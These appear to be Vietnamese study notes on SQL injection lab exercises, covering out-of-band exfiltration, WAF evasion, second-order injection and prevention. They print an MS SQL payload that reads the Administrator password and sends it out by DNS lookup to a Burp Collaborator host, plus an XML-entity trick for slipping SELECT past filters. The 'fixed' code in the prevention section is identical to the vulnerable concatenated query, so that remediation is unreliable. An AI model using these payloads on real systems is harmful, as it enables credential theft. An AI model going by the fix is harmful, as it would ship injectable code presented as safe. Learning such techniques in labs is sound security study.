- Truy vấn SQL được thực thi không đồng bộ và useless trên response. Nên ta sẽ phải dùng đến kĩ thuật out-of-band
- Mục tiêu của lab này thì thực hiện DNS lookup :||
- Check các payload này ![image](https://github.com/Myozz/Web_Applications/assets/94811005/5bf49424-e171-4e75-95ca-60ce3b168c7c)
- Inject payload vào sau trackingID
- CHọn cái ```BURP-COLLABORATOR-SUBDOMAIN/``` (để nguyên cái http ở trước, rồi chuột phải - ```INsert collaborator payload```
- Quay sang tab Collaborator, ta sẽ thu được kết quả (thường thì nó tự ra, không thì bấm pool)

# Out-of-band (Tiếp)
- Vừa rồi chúng ta đã xác định được cách thức hoạt động của OAST, bạn còn có thể sử dụng OAST channel để lọc dữ liệu từ vuln app. Ví dụ

      '; declare @p varchar(1024);set @p=(SELECT password FROM users WHERE username='Administrator');exec('master..xp_dirtree "//'+@p+'.cwcsgt05ikji0n1f2qlzn5118sek29.burpcollaborator.net/a"')--
- Input này độc pass của ``admin``` user, thêm nột Collaborator subdomain đặc biệt vào, và kích hoạt dns lookup. Lookup này cho phép bạn xem password được ghi lại

      S3cure.cwcsgt05ikji0n1f2qlzn5118sek29.burpcollaborator.net
## Liêm lab
- Lab này vẫn giống lab trước, khác ở chỗ ta cần dùng OAST để tìm ra pass của ```admin```
- Vẫn là tận dụng cheatsheet ![image](https://github.com/Myozz/Web_Applications/assets/94811005/c1d62fa8-9e16-4533-8ac9-ba74bd3f56e1)

# SQLi trong các bối cảnh khác nhau
- Ở lab trước,ta đã sử dụng chuỗi truy vấn để inject SQL payload. Tuy nhiên, bạn có thể thực hiện SQLi atk bằng input ở những vị trí truy vấn trong app. Ví dụ, một số web để input ở dạng ```json``` hay ```xml``` và sử dụng để truy vấn dtb
- Nhưng định dạng khác nhau có thể cung cấp những cách khác nhau cho bạn làm xáo trộn các cuộc atk bị chặn bởi WAF và các cơ chế phòng thủ khác
- Triển khai yếu thường gây ra các SQLi phổ biến trong request, nên bạn có bạn bypass những filter này bằng cách encoding hay escaping char trong keyword bị chặn. Ví dụ, SQLi XML-based dưới đây sử dụng một XML escape sequence để encdoe kí tự  ```S``` trong ```SELECT```

      <stockCheck>
          <productId>123</productId>
          <storeId>999 &#x53;ELECT * FROM information_schema.tables</storeId>
      </stockCheck>
- Cái này sẽ được decode phía server trước được gửi qua trình thông dịch của SQL
## Lab lông lá
- Sử dụng UNION atk để lấy acc admin
- Nếu ta có gắng dùng UNION thì sẽ có thông báo atk detect từ mục tiêu, vậy là ta sẽ phải bypass được cơ chế phòng thủ của mục tiêu ![image](https://github.com/Myozz/Web_Applications/assets/94811005/0db98a88-a15b-4a8e-8206-e60ba7940f6b)
- Download Extensions ```Hackvertor``` nếu chưa có
- Quay lại request ở Repeater, ta chọn đoạn payload cần xử lý, chuột phải, Extensions > Hackvertor > Encode > dec_entities/hex_entities
- Và bùm ![image](https://github.com/Myozz/Web_Applications/assets/94811005/aac8c546-ab67-4b9f-b6dc-120794cff2c3)

# SQLi bậc 2
- SQLi bậc 1 xảy ra khi app xử lý input của user từ một HTTP request và kết hợp các input vào một truy vấn SQL theo cách không an toàn
- SQLi bậc 2 xảy ra khi app lấy user input từ một HTTP request và lưu trữ chúng để dùng trong tương lai. Điều này thường được thực hiện bằng cách nhét input vào dtb, nhưng không có vuln xảy ra tại điểm mà data dược lưu trữ. Sau đấy, khi xử lý một HTTP request khác, app khai thác thông tin được lưu trữ và đưa nó vào trong truy vấn SQL. Vì lí do này, SQLi bậc 2 còn được gọi là SQLi lưu trữ
- SQLi bậc 2 thường xảy ra trong tình huống mà dev sợ SQLi vuln, và xử lý thông tin cẩn thận với input vào trong dtb. Khi data được xử lý sau, nó được coi là an toàn, khi nó được quăng vào dtb . Tại điểm này, data được xử lý không an toàn, bởi dev đần vcl nghĩ nó được được trusted

# Làm sao để counter SQLi
- Ta có thể ngăn chặn hầu hết các loại SQLi bằng cách sử dụng các truy vấn được tham số hoá thay vì ở dạng xâu. Những truy vấn này cũng được gọi là "câu lệnh chuẩn bị trước"
- Đoạn code dưới đấy chứa SQLi vuln bửi user input được nối tiếp với truy vấn

      String query = "SELECT * FROM products WHERE category = '"+ input + "'";
      Statement statement = connection.createStatement();
      ResultSet resultSet = statement.executeQuery(query);
- Ta có thể xử lý lại đoạn code để tránh SQLi bị khai thác

      String query = "SELECT * FROM products WHERE category = '"+ input + "'";
      Statement statement = connection.createStatement();
      ResultSet resultSet = statement.executeQuery(query);
- Ta có thể sử dụng truy vấn tham số hoá trong mọi tình huống mà input không đáng tin trong hệ thống, bao gồm ```where``` và ```insert``` hay ```update```. Chúng không thể sử dụng để xử lý input trong các phần khác của truy vấn, như là bảng về cột, hay ```order_by```. Chức năng app mà đặt data không được tin tưởng vào các phần của truy vấn 
